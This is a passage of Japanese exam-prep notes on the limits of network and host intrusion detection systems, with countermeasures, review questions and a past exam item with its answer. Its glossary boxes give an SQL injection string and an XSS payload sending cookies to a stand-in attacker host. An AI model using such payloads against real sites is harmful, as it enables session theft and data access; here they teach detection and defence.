**② NIDSの処理能力不足によるパケットの取りこぼし**：監視するネットワークのトラフィック量とNIDSセンサのスペックが見合っていないと、NIDSはパケットを取り込みきれず、取りこぼしたパケットに含まれる攻撃を見逃します（フォールスネガティブの原因になります）。NIDSの負荷を高める最も大きな原因はトラフィックの量です。それに加え、検知の対象としているシグネチャの量が多いことも原因となります。また、大規模Webサイトなどで、携帯端末からのアクセスによる**ショートパケット**（データ長の短いパケット）の量が多い場合にも、取りこぼしが発生しやすくなります。NIDSの処理はパケットの個数に比例して重くなるため、同じ通信量でもパケットが小さく数が多いほど負荷が高くなるからです。

この問題への対応策には、次のようなものがあります。

- 管理者は、不要なシグネチャを監視の対象から外すなどの調整を行ったうえで、NIDSの最適なスペックや構成を再検討する
- 1台のセンサで十分な性能が出せない場合には、管理者は別機種へのリプレースやNIDSセンサの負荷分散を検討する
- 管理者は、パケット取りこぼしの実態を把握するため、**ベンチマークテスト**を定期的に実施する

**③ アプリケーションに対する攻撃を検知できない**：本ノート 2.3 で解説したように、**SQLインジェクション**や**XSS**をはじめ、組織がサイト用に独自の仕様で開発したアプリケーションプログラムの脆弱性を突いた攻撃などは、NIDSではほとんど検知できません。攻撃文字列はアプリケーションごとにパラメータ名も入力の形も異なり、汎用のシグネチャでは「正常な入力」と区別しきれないからです。

有効な対応策は、管理者が独自にシグネチャを作成して対応するか、Webアプリケーションに対する攻撃であれば、**Webアプリケーションファイアウォール**（**WAF**、5.8）を導入することです。いうまでもなく、これらの対策を実施するかどうかにかかわらず、開発者がWebアプリケーション自体の脆弱性をなくすこと（2.8 で学んだプレースホルダの利用やエスケープ処理などのセキュアプログラミング）は必須です。

> **SQLインジェクション**
> ユーザの入力値をもとにSQL文を組み立ててデータベース(DB)に問い合わせ、その結果を表示するWebアプリケーションに対し、不正なSQL文を入力することで、データベース内の情報の窃取や改ざんなどを行う攻撃手法である。
> 入力値の例：`' OR '1'='1' --`（検索条件を常に真にして全件を取り出そうとする）

> **XSS(クロスサイトスクリプティング:Cross-Site Scripting)**
> 利用者の入力データをそのままWebページに出力するWebアプリケーションの脆弱性を悪用し、悪意のあるスクリプトを利用者のブラウザ上で実行させる攻撃手法、又はそのような攻撃を許す脆弱性のことである。
> 入力値の例：`<script>location.href='https://attacker.example.net/?c='+document.cookie</script>`（閲覧者のCookieを攻撃者のサーバへ送らせる）

**④ 一部の高性能な機種を除き、暗号化されたパケットは解析できない**：SSL/TLSなどで暗号化された通信は、NIDSではパケットの内容を解析できないため、その中に含まれる攻撃を検知できません。現在はWebサイトの大半がHTTPSで提供されているため、これは非常に大きな制約です。HTTPSを利用するWebサイトを監視する場合は、管理者は**SSLアクセラレータ**機能をもった負荷分散装置を使用して通信を復号し、復号後の区間にNIDSを設置するのが望ましいでしょう。その他の暗号化通信については、個別に検討が必要です。

```text
【HTTPSサイトでのNIDSの設置位置】
インターネット ── FW ── [負荷分散装置（SSLアクセラレータ）] ── スイッチ ── Webサーバ群
                        ↑ここまでは暗号化(HTTPS)          │(ミラーポート)
                                                         [NIDS] ← 復号後の平文(HTTP)を監視
```

なお、「SSL」という名称のプロトコル（SSL 3.0 まで）は脆弱性のため現在は使用が禁止されており、実際に使われているのは TLS（TLS 1.2／1.3）です。ただし「SSLアクセラレータ」「SSL復号」のように、製品名や機能名には慣用的に SSL の語が残っています。

**⑤ 攻撃は検知できても侵入を検知できない**：NIDSは、攻撃が行われたことは検知できても、実際に侵入が行われたことは検知できないことが多いのです。本ノート 3.3 で見たように、アラートは「攻撃の試み」を示すだけだからです。とはいえ、5.3 で解説した**脆弱性診断**の結果との突合せ（「攻撃されたサーバにその脆弱性が実際にあったか」を確認する）や、セッション情報の保存・分析（攻撃後にどんな応答が返ったかを見る）などによって、検知の精度は確実に向上しています。

**⑥ 不正アクセスを防御できない**：前述のように、NIDSにはTCPコネクションの強制切断などの防御機能もあります。しかし、NIDSは**インライン接続**で使用する機器ではないため、攻撃を排除するには限界があります。NIDSがRSTパケットを送るのは攻撃パケットを見た**後**なので、少なくとも最初の攻撃パケットは標的に届いてしまうからです。防御は、**IPS**（Intrusion Prevention System：侵入防止システム、5.7）やWebアプリケーションファイアウォール（5.8）で行うべきです。

**⑦ 正当な権限者による内部犯罪の検知は困難**：NIDSは、不正な手法が用いられた場合は検知可能です。しかし、正当なユーザが行う正常な行為（アクセスを許可されているファイルをクライアント環境にコピーする行為など）から、内部犯罪の可能性を判断することはできません。これについては、管理者はアクセスログの監査や情報漏えい対策製品（**DLP**）の導入など、別の手段を考える必要があります。4.7 で学んだ内部不正防止ガイドラインの「見つかる状況を作る」対策が、ここで効いてきます。

> **IPS(Intrusion Prevention System)**
> ネットワークにインライン接続され、通過するパケットを監視して、攻撃と判断した通信をリアルタイムに遮断するシステムである。IDSの検知機能に防御機能を加えたものといえる。

### 5.2 HIDSの機能上の限界と運用上の課題

HIDSには、次のような機能上の限界や運用上の課題があります。

**① あくまでもOSの基本的な機能がベースであり、それ以上のことはできない**：HIDSは、OSのロギング機能やセキュリティ機能を用いて事象を検知しています。したがって、リアルタイム性を求めないのであれば、HIDSの検知機能はOSの基本的な機能でも代行できます。たとえば管理者が認証ログを毎朝確認したり、ファイルのハッシュ値を毎晩比較するスクリプトを動かしたりすれば、HIDSと同じ事象は（遅れて）見つけられます。逆にいえば、OSがログに残さない事象はHIDSにも見えません。

**② 監視対象のホストごとに導入・管理が必要となる**：管理者は、HIDSを監視対象のホストごとにインストールする必要があり、対応するOSも製品によって限られます。そのため、監視対象ホストが多い場合は、導入や運用管理のコストが大きくなります。また、攻撃者にホストへ侵入されてしまうと、攻撃者によってHIDS自体が停止されたり、そのログが改ざんされたりするおそれもあります。このため管理者は、HIDSの検知結果やログをホストの外（マネジメントコンソールやSIEM、ログサーバ）へ即時に転送しておくべきです。

**③ 導入によって監視対象ホストの性能や可用性に悪影響を及ぼす可能性がある**：HIDSは監視対象ホスト上で常駐して動作するため、ホストの資源（CPU、メモリ、ディスクI/O）を消費します。そのため、管理者は導入前に十分な検討を行うとともに、導入後もチューニングを行う必要があります。

**④ 攻撃の予兆を検知することは困難**：HIDSは、ポートスキャンなどネットワーク上で行われる攻撃の予兆となる事象を検知するのは困難です。ポートスキャンのパケットの多くは、OSがログに残さないまま応答（または破棄）されてしまうからです。ただし、ファイアウォールのログなどを分析することで検知できる可能性はあります。

**⑤ 正当な権限者による内部犯罪の検知は困難**：NIDSの⑦と同様の理由により困難です。ただし、あらゆる操作をロギングして分析すれば、たとえ権限者による不正行為であっても検知できる可能性はあります。

| 限界・課題 | 誰が・何で補うか |
|---|---|
| 未知の攻撃（ゼロデイ）を検知できない | 管理者がアノマリ検知を併用する。マルウェアならサンドボックス（5.9）で振る舞いを見る |
| 独自Webアプリへの攻撃を検知できない | 管理者が独自シグネチャを作る、WAF（5.8）を導入する。開発者が脆弱性そのものを修正する |
| 暗号化通信の中身が見えない | 管理者がSSLアクセラレータで復号した後の区間にNIDSを置く。HIDSでホスト側の結果を見る |
| 検知しても止められない | 管理者がIPS（5.7）やWAFをインラインに置いて遮断する |
| 攻撃の成否が分からない | 管理者がHIDS・サーバログ・脆弱性診断の結果と突き合わせる（SIEMで相関分析） |
| 正当な権限者による内部犯罪 | 管理者がアクセスログを監査する、DLPを導入する |
| HIDSの停止・ログ改ざん | 管理者がログをホスト外へ即時転送し、HIDSの稼働を監視する |

## 6. 確認問題

### 6.1 理解度チェック（Check!）

- **Q1**：IDSとは何か。
- **Q2**：NIDSでどのような事象が検知できるのか。
- **Q3**：HIDSでどのような事象が検知できるのか。
- **Q4**：NIDSとHIDSはどう違うのか。
- **Q5**：IDSが検知できない攻撃とは何か。また、それについてはどのような解決策があるのか。

> **解答例**
> - **Q1**：ネットワークやホストで発生している事象をリアルタイムに監視して侵入や攻撃を検知し、管理者への通知などのアクションを実行するシステム。ファイアウォールが見ないパケットのペイロードやホストの状態を監視し、対策の4機能のうち「検知・追跡」を担う。
> - **Q2**：ポートスキャン、OSやサーバソフトウェアの既知の脆弱性を突いた攻撃（BOF攻撃など）、サーバソフトウェアへの不正なコマンドの発行、ネットワーク経由のパスワードクラッキング、パケットを偽装するタイプのDoS攻撃（以上はシグネチャ型）。加えて、大量送信型のDoS攻撃、未知の攻撃、侵入後の異常な振る舞い（アノマリ型）を検知できる可能性がある。
> - **Q3**：ログインの成功／失敗、重要なリソースへのアクセス、不正なプログラムのインストール、システムディレクトリのファイルの書換え／削除、Webコンテンツの改ざん、ネットワーク環境で発生している障害。
> - **Q4**：NIDSはネットワークセグメントに接続してセグメントを流れるパケットを監視し、攻撃の試み（ポートスキャン、BOF攻撃、DoS攻撃など）に強い。HIDSは監視対象ホストにインストールしてログやファイル操作を監視し、ホスト上で起きた結果（改ざん、不正プログラムのインストール、ログイン失敗など）に強い。両者を組み合わせると、攻撃の発見から被害状況・侵入手口の分析までが可能になる。
> - **Q5**：シグネチャ型では未知の攻撃（ゼロデイ攻撃）とサイト独自のアプリケーションの脆弱性を突いた攻撃を検知できない。暗号化された通信の中身や、正当な権限者による内部犯罪も検知が困難。解決策は、シグネチャの常時更新とアノマリ検知の併用、独自シグネチャの登録やWAFの導入（とアプリケーション自体の脆弱性の解消）、SSLアクセラレータで復号した後の区間での監視、アクセスログの監査やDLPの導入である。

### 6.2 演習問題（過去問題）

ウイルス対策ソフトでの、フォールスネガティブに該当するものはどれか。

- ア　ウイルスに感染していないファイルを、ウイルスに感染していないと判断する。
- イ　ウイルスに感染していないファイルを、ウイルスに感染していると判断する。
- ウ　ウイルスに感染しているファイルを、ウイルスに感染していないと判断する。
- エ　ウイルスに感染しているファイルを、ウイルスに感染していると判断する。

*［情報処理安全確保支援士試験・H29］*

> **解答：ウ**
> フォールスネガティブとは、本来検知すべき不正（ここではウイルス感染）を見逃してしまうことである。したがって、感染しているファイルを「感染していない」と判断するウが該当する。イはフォールスポジティブ（誤検知）、アとエは正しい判定である（アは true negative、エは true positive）。IDSでもウイルス対策ソフトでも、「ネガティブ＝正常と判定」「フォールス＝その判定が誤り」と分解すれば迷わない。

## 7. 試験対策まとめ（重要ポイント）

### 7.1 知識の確認（科目A-2向け）

- **IDSとファイアウォールの違い**：ファイアウォールはヘッダ情報に基づくアクセス制御（予防）、IDSはペイロードやホストの状態に基づく検知と通知（検知・追跡）。ファイアウォールのログはヘッダ情報中心で、脆弱性を突いた攻撃の発見にはほぼ使えない。
- **NIDS と HIDS**：NIDSはセグメントに接続してパケットを見る（ポートスキャン、BOF、DoS、コマンド発行に強い）。HIDSはホストにインストールしてログ・ファイルを見る（ログイン成否、改ざん、不正プログラムのインストールに強い）。
- **NIDSの接続場所**：1台ならDMZが必須。バリアセグメントの監視はDMZとの比較で初めて意味をもつ。内部セグメントはマルウェアのまん延の発見に有効。
- **シグネチャ型（ミスユース検知・不正検知） と アノマリ型（異常検知）**：「攻撃パターンに一致したら不正」と「正常（RFC仕様・平常時）から外れたら不正」。前者は未知の攻撃に弱く、後者は誤報が多くなりやすい。選択肢の「通常時の通信から外れた」はアノマリ型、「定義した異常な通信と合致」はシグネチャ型。
- **フォールスポジティブ と フォールスネガティブ**：正常を不正と判定（誤検知）と、不正を正常と判定（見逃し）。トレードオフの関係にあり、継続的なチューニングで両方を最小化する。
- **NIDSの限界**：パケットの取りこぼし（トラフィック量・シグネチャ数・ショートパケット）、独自アプリへの攻撃、暗号化通信、侵入の成否、防御（インラインでない）、内部犯罪。
- **HIDSの限界**：OSの機能以上のことはできない、ホストごとの導入・管理、ホストの性能への影響、攻撃の予兆の検知が困難、侵入されるとHIDS自体が停止・改ざんされるおそれ。

### 7.2 記述式で問われる観点（科目B向け）

- **アラートとログの読解**：IDSのアラート（送信元、宛先、ルール、時刻）とWebサーバのアクセスログ（ステータスコード、応答サイズ）を突き合わせ、「攻撃は試みられたが失敗した（403）」「成功した可能性がある（200 で応答サイズが大きい）」と根拠つきで判断できるようにする。
- **センサの設置場所を理由つきで答える**：「ファイアウォールを通過した攻撃を検知するために、NIDSをDMZに設置する」「内部で感染したマルウェアの横展開を検知するために、内部セグメントにも設置する」のように、場所と目的を1文で結びつける。
- **誤検知への対応策**：「脆弱性診断の送信元IPアドレスを除外登録する」「業務上の繁忙期をベースラインに反映する」など、フォールスポジティブを減らしつつフォールスネガティブを増やさない具体策を書けるようにする。
- **IDSの限界と補完策**：「IDSは検知のみで遮断できないため、IPSをインラインに設置する」「HTTPS通信は検査できないため、SSLアクセラレータで復号した後の区間に設置する」「独自Webアプリへの攻撃は検知できないため、WAFを導入し、アプリの脆弱性自体を修正する」の形で、限界と対策をペアで書く。
- **HIDSのログ保全**：侵入されたホストではHIDSやログが改ざんされうるため、ログを外部のログサーバやSIEMへ即時転送すべき、という理由付けは、インシデント対応（証拠保全）の設問でも使える。
